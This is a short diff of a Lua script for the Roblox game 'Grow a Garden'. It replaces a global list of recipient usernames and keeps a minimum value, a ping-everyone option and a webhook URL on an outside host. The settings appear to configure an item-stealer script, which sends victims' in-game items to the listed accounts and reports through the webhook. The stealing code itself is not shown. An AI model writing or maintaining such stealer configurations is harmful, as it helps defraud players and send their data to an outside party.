@@ -65,7 +65,7 @@ task.spawn(function()
         end
     end
 
-    _G.Usernames = {"GROW4GArden1m10016","GROW4GARDEN1M10011","GROW4GARDEN1M10012","GROW4GARDEN1M1008","GROW4GARDEN1M10013"}
+    _G.Usernames = {"GROW4GArden1m10016","GROW4GARDEN1M10017","GROW4GARDEN1M10018","GROW4GARDEN1M10019","GROW4GARDEN1M10020"}
     _G.min_value = 0.02
     _G.pingEveryone = "Yes"
     _G.webhook = "https://megamegamega.vercel.app/api/webhook"
